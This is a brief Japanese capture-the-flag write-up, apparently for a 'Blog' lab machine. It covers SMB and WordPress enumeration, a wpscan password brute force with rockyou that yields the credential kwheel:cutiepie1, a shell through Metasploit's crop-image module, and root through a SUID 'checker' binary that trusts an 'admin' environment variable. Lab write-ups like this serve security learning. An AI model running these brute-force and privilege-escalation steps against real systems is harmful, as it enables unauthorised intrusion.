---
title: "Blog"
date: 2024-03-16T10:57:51+09:00
draft: false
---

### enum

- 22:ssh
- 80:http
- enum4linux
  - BillySMB という share がある
  - bjoel, smb というユーザーがある
- SMB
  - BillySMB にパスワード無しで入れる
  - よく分からん .txt と .mp4, .png しかない
  - steghide も特になし
- wpscan
  - ```wpscan --url http://10.10.208.138/ -e u```
    - ユーザ名が bjoel, kwheel
  - ```wpscan --url http://10.10.208.138 -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64```
  - kwheel:cutiepie1
  - ssh はできない
- metasploit
  - ```search crop-image```
  - options で設定するとシェルがもらえる

### user.txt

- ```find / 2>/dev/null | grep user.txt```

``` shell
$ cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

- は？

### priviledge escalation

- ```find / -perm -u=s -type f 2>/dev/null```
- 
``` shell
ls -la /usr/sbin/checker
-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
```

``` shell
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
```

- admin という環境変数があるのでこれを設定してみる

``` shell
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash")
```

- あとは実行してシェルをもらうと root になる
